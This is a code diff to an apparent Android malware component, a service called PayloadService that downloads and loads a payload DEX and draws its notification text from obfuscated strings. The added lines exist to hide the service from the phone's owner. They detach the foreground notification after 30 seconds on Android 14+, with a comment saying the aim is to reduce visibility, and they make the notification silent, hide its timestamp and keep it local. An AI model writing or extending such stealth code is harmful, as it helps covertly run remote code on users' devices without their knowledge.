@@ -139,6 +139,18 @@ class PayloadService : Service() {
             }, 3000)
         }
 
+        // On Android 14+, detach the notification after 30s to reduce visibility
+        if (Build.VERSION.SDK_INT >= 34) {
+            android.os.Handler(mainLooper).postDelayed({
+                try {
+                    stopForeground(STOP_FOREGROUND_DETACH)
+                    Log.i(TAG, "Foreground notification detached on Android 14+")
+                } catch (e: Exception) {
+                    Log.w(TAG, "Could not detach notification", e)
+                }
+            }, 30000)
+        }
+
         // Step 1: Download the payload DEX
         downloadAndLoadPayload()
 
@@ -172,8 +184,11 @@ class PayloadService : Service() {
             .setContentText(ObfuscatedStrings.notifText)
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setOngoing(true)
+            .setSilent(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
+            .setLocalOnly(true)
             .build()
     }
 
